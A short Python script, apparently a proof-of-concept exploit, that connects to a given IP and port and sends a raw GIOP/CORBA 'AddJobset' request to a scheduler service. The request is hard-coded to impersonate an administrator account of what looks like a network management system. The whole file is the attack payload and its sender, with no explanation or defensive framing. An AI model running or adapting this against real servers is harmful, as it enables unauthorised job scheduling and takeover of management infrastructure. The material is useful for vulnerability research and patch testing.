import socket
import argparse
import os, sys


def argParse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", required=True, dest="ip", help="IP Address", metavar='')
    parser.add_argument("-p", "--port", required=True, dest="dp", help="Desitnation Port", metavar='')

    args = parser.parse_args()

    IP = str(args.ip)
    PORT = int(args.dp)
    connect(IP,PORT)

def connect(IP, PORT):
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP,PORT))

def initPacket():

    GIOP_REQUEST = "47494f50010000000000012600000000"
    GIOP_ID = "00000001"
    data1 = "01000000000000135363686564756c6572496e7465726661636500000000000a4164644a6f625365740000000000000000000008"
    jobname = "MYJOB01".encode('hex')
    data2 = "00000007e0000000060000001b00000010000000240000000000000000000000000000000000000000000000000000000000000000002a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000083131313131313100010000000000000000000000000000010000000000000000000000000000003f7569643d"
    usernamedata = "xxx.y.zzzzz,cn=Administrators,cn=8770 administration,o=nmc".encode('hex')
    data3 = "00000000000a6f6d6e69766973626200"

    addjobset = (GIOP_REQUEST+GIOP_ID+data1+jobname+data2+usernamedata+data3)
    return addjobset


def send():
    print("[i] Sending AddJobset Packet")
    s.send(initPacket().decode('hex'))
    print(s.recv(1024))
    s.close()


if __name__ == "__main__":
    argParse()
    send()



